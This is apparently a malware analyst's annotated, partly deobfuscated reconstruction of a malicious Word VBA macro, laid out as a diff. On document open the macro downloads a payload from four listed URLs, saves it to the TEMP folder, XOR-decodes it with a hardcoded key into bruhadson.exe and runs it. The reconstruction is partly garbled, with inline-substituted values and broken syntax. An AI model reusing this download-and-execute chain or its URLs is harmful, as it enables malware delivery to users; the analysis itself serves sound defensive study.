@@ -1,0 +1,251 @@
+LocalBrowser.T2.Text -> setAsMainTarget
+CallByName c, LocalBrowser.T2.Text, _VbMethod -> CallByName c, setAsMainTarget, _VbMethod
+tt = ThisDocument.BuiltInDocumentProperties("Content status").Value -> tt = Microsoft.XMLHTTPAbcdefAdodb.streaMAbcdefshell.ApplicationAbcdefWscript.shellAbcdefProcessAbcdefGeTAbcdefTeMPAbcdefTypeAbcdefopenAbcdefwriteAbcdefresponseBodyAbcdefsavetofileAbcdef\bruhadson.exe
+LocalBrowser.Label1.Caption -> rundll32.exe 
+LocalBrowser.Command.Caption -> V
+LocalBrowser.ZK.Caption -> http://
+LocalBrowser.OptionButton1.Tag -> Open
+LocalBrowser.ToggleButton1.Caption -> Send
+LocalBrowser.Label2.Caption -> File
+
+
+// ThisDocument
+Sub autoopen()
+	SignIn_Fish = 0
+	Synomati "a4833"
+End Sub
+
+// Module1
+Public Function Synomati(Comps)
+	GoTo l12
+	l12:
+	Dim c As STRIX
+	Set c = New STRIX
+	CallByName c, setAsMainTarget, _VbMethod
+End Function
+
+// STRIX
+Public Function setAsMainTarget() As String
+	tt = Microsoft.XMLHTTPAbcdefAdodb.streaMAbcdefshell.ApplicationAbcdefWscript.shellAbcdefProcessAbcdefGeTAbcdefTeMPAbcdefTypeAbcdefopenAbcdefwriteAbcdefresponseBodyAbcdefsavetofileAbcdef\bruhadson.exe
+	MotoGP = Split(Microsoft.XMLHTTPAbcdefAdodb.streaMAbcdefshell.ApplicationAbcdefWscript.shellAbcdefProcessAbcdefGeTAbcdefTeMPAbcdefTypeAbcdefopenAbcdefwriteAbcdefresponseBodyAbcdefsavetofileAbcdef\bruhadson.exe, "Abcdef")
+		// MotoGP = Microsoft.XMLHTTP,Adodb.streaM,shell.Application,Wscript.shell,Process,GeT,TeMP,Type,open,write,responseBody,savetofile,\bruhadson.exe
+		// MotoGP is nothing more than an array of values above that gets called throughout the code after the 'abcdef' string gets SPLIT out
+	
+	privateProbeName = MotoGP = Microsoft.XMLHTTP,Adodb.streaM,shell.Application,Wscript.shell,Process,GeT,TeMP,Type,open,write,responseBody,savetofile,\bruhadson.exe(0)
+		// privateProbeName = Microsoft.XMLHTTP
+	
+	privateProbe
+	setAsMainTarget = ""
+End Function
+
+// Module1
+Public Sub privateProbe()
+	Set AbsoluteHidMachine = CreateObject(Microsoft.XMLHTTP)
+		// Start of the opening for the outbound connection to the websites
+	
+	smbi = rundll32.exe
+	MotoGPE = MotoGP(shell.Application)
+	Set SignIn_avatar = CreateObject(MotoGP(Wscript.shell))
+	Shtefin = Replace("bionorica.md/TrfHn4Vbetter57toiuydof.net/af/TrfHn4Vyoutoolgrabeertorse.org/af/TrfHn4Venseling-gmbh.de/TrfHn4", "RRDD", "om")
+		// This search returns nothing since it is looking for RRDD and is to replace it with om
+
+	Shtefin = Replace(Shtefin, "\", "/")
+		// This search returns nothing since it is looking for \ and replacing it with a /
+
+	cnpk = Split("bionorica.md/TrfHn4Vbetter57toiuydof.net/af/TrfHn4Vyoutoolgrabeertorse.org/af/TrfHn4Venseling-gmbh.de/TrfHn4", V)
+		// cnpk = bionorica.md/TrfHn4 better57toiuydof.net/af/TrfHn4 youtoolgrabeertorse.org/af/TrfHn4 enseling-gmbh.de/TrfHn4
+
+	Set SubProperty = CreateObject(MotoGP(Adodb.streaM))
+	Set SignIn_aifde = CreateObject(MotoGP(shell.Application))
+	Set SignIn_RDD2 = CreateObject(MotoGP(Wscript.shell)).Environment(MotoGP(Process))
+	itemI = 6
+	SignIn_LAKOPPC = CreateObject(MotoGP(Wscript.shell)).Environment(MotoGP(Process))(MotoGP(TeMP))
+		// This is looking at the environment variables from the CLI, in particular the TEMP directory
+	RepackOK "4", "3", "5"
+End Sub
+
+// Module1
+Public Sub RepackOK(sheetToMove As String, sheetAnchor As String, High6OrAfter As String)
+	// Public Sub RepackOK(4 As String, 3 As String, 5 As String)
+	Dim i
+	
+	For i = LBound(bionorica.md/TrfHn4) To UBound(enseling-gmbh.de/TrfHn4) Step 1
+		// I think this is why we only see the first URL used - because it is only stepping 1 and not everything in the array
+		
+		SaveDataCSVToolStripMenuItem_Click 72
+	
+	If AbsoluteHidMachine.Status <> 200 Then
+		Err.Raise 700 + vbObjectError, "V", "W"
+	End If
+	High6 "3", 33
+	Exit Sub
+Exit Sub
+
+Public Sub SaveDataCSVToolStripMenuItem_Click(e As Integer)
+	// Public Sub SaveDataCSVToolStripMenuItem_Click(72 As Integer)
+	SignIn_4 = http:// & bionorica.md/TrfHn4
+	itemI = 6 + 2
+		// itemI = 8
+
+	Dim XIpotom2 As STRIX
+	Set XIpotom2 = New STRIX
+	If 72 < 488 Then
+		XIpotom2.Challenge "Swed", 13
+		CallByName CreateObject(Microsoft.XMLHTTP), Send, VbMethod
+		Set XIpotom2 = Nothing
+	Else
+	End If
+End Sub
+
+// STRIX
+Public Sub Challenge(sender As String, e As Integer)
+	// Public Sub Challenge(Swed As String, 72 As Integer)
+
+	PlayCry 1
+	PlayCry 350
+End Sub
+
+Public Sub PlayCry(cry As Integer)
+	// Public Sub PlayCry(1 As Integer)
+
+If cry = 1 Then
+	CallByName CreateObject(Microsoft.XMLHTTP), Open, VbMethod, GeT, http:// & bionorica.md/TrfHn4, False
+Exit Sub
+
+Public Sub PlayCry(cry As Integer)
+	// Public Sub PlayCry(350 As Integer)
+
+If cry = 1 Then
+	// This just quits since cry is now equal to 350
+Exit Sub
+
+// Module2
+Public Function High6(FullPath As String, NumHoja As Integer) As String
+	// Public Function High6(3 As String, 33 As Integer) As String
+	
+	SignIn_ProjectSpeed
+	CallByName CreateObject(MotoGP(Adodb.streaM)), "O" + "pen", VbMethod
+	SignIn_PokerFace = CallByName(CreateObject(Microsoft.XMLHTTP), "responseBody", VbGet)
+	LoadCry 0, 1
+End Function
+
+// Module2
+Public Function SignIn_ProjectSpeed()
+GoTo labelBabel2
+
+labelBabel2:
+SignIn_Project = CreateObject(MotoGP(Wscript.shell)).Environment(MotoGP(Process))(MotoGP(TeMP))
+SignIn_PathTo2 = CreateObject(MotoGP(Wscript.shell)).Environment(MotoGP(Process))(MotoGP(TeMP)) + "\fremsoho" + CStr(8)
+	// This is where the file name comes from and how it is written to the TEMP folder
+
+GoTo labelBabel3   
+
+labelBabel3:
+SignIn_Project = CreateObject(MotoGP(Wscript.shell)).Environment(MotoGP(Process))(MotoGP(TeMP)) + Replace(\bruhadson.exe), ".", CStr(8) + ".")
+CreateObject(MotoGP(Adodb.streaM)).Type = 1 
+	// Specifies that the stream is binary (https://www.w3schools.com/asp/prop_stream_type.asp)
+End Function
+
+// Module 4
+Public Function LoadCry(index As Integer, cryTable As Integer)
+	//Public Function LoadCry(0 As Integer, 1 As Integer)
+
+	Dim c As STRIX
+	Set c = New STRIX
+	CallByName c, "Ant", _VbMethod
+	
+End Function
+
+// STRIX
+Public Sub Ant()
+CreateObject(MotoGP(Adodb.streaM)).Write CallByName(CreateObject(Microsoft.XMLHTTP), "responseBody", VbGet)
+	GoTo cip
+	
+	//Not sure if this block is used or if it is garbage. Left it in just in case.
+	If Not CryToLoad.Compressed Then
+	For g = 0 To CryToLoad.Size - 1
+	CryToLoad.Data(g) = ByteTo.SignedInt("&H" & (Rea.dHEX(LoadedROM, (cryOffset) + 16 + g, 1)))
+	Next
+	Else
+	If alignment = 0 Then
+	pcmLevel = ByteTo.SignedInt("&H" & (Rea.dHEX(LoadedROM, offtrack, 1)))
+	offtrack = offtrack + 1
+	Data.Add (pcmLevel)
+	alignment = &H20
+	End If
+	offtrack = offtrack + 1
+	If alignment < &H20 Then
+	Data.Add (pcmLevel)
+	End If
+	Data.Add (pcmLevel)
+	If Size >= CryToLoad.Size Then
+	End If
+	alignment = 1
+	CryToLoad.Data = Data.ToArray()
+	CryToLoad.Size = offtrack - Start
+	End If
+	
+	cip:
+	CallByName CreateObject(MotoGP(Adodb.streaM)), "saveTo" + _
+	File, VbMethod, CreateObject(MotoGP(Wscript.shell)).Environment(MotoGP(Process))(MotoGP(TeMP)) + "\fremsoho" + CStr(8), 2
+	If SignIn_Fish <> 0 Then
+		Exit Sub
+	End If
+	High4 "4", 3
+End Sub
+
+// Module4
+Public Function High4(FullPath As String, NumHoja As Integer) As String
+	// Public Function High4(4 As String, 3 As Integer) As String
+
+	WidthA CreateObject(MotoGP(Wscript.shell)).Environment(MotoGP(Process))(MotoGP(TeMP)) + "\fremsoho" + CStr(8), CreateObject(MotoGP(Wscript.shell)).Environment(MotoGP(Process))(MotoGP(TeMP)) + Replace(\bruhadson.exe), ".", CStr(8) + "."), "6WLms4bGcHU5iDixvWv6Wmuql3ILxV8S"
+	CreateObject(MotoGP(shell.Application)).Open (CreateObject(MotoGP(Wscript.shell)).Environment(MotoGP(Process))(MotoGP(TeMP)) + Replace(\bruhadson.exe), ".", CStr(8) + "."))
+End Function
+
+// Module 3
+Public Sub WidthA(Dbbb As String, bbbJ As String, Optional SignIn_Sexote As String)
+	Dim bbb As Integer
+	bbb = FreeFile
+	Dim Gbbb() As Byte
+	Open Dbbb For Binary As #bbb
+	ReDim Gbbb(0 To LOF(bbb) - 1)
+	Get #bbb, , Gbbb()
+	Close #bbb
+
+	Call Subfunc(Gbbb(), SignIn_Sexote)
+	bbb = FreeFile
+	Open bbbJ For Binary As #bbb
+	Put #bbb, , Gbbb()
+	Close #bbb
+End Sub
+
+// Module 4
+Public Sub Subfunc(MethodParam2() As Byte, MethodParam As String)
+	Dim oldj2 As Long
+	Dim oldj3 As Long
+	Dim oldj5 As Long
+	Dim oldj6 As Long
+	Dim plusplus() As Byte
+	Dim oldj4 As Long
+	Dim plusplusLen As Long
+	
+	plusplusLen = Len(MethodParam)
+	ReDim plusplus(plusplusLen)
+	
+	plusplus = StrConv(MethodParam, vbFromUnicode
+	
+	oldj2 = UBound(MethodParam2) + 1
+	oldj5 = oldj2
+	
+	
+	For oldj4 = _0 To (oldj2 - 1)
+		aa = plusplus(oldj4 Mod plusplusLen)
+		bb = MethodParam2(oldj4)
+		MethodParam2(oldj4) = OrAndNotAnd(bb, aa)
+		
+		If (oldj4 >= oldj6) Then
+			oldj3 = Int((oldj4 / oldj5) * 100)
+			oldj6 = (oldj5 * ((oldj3 + 1) / 100)) + 1
+		End If
+	Next
+End Sub
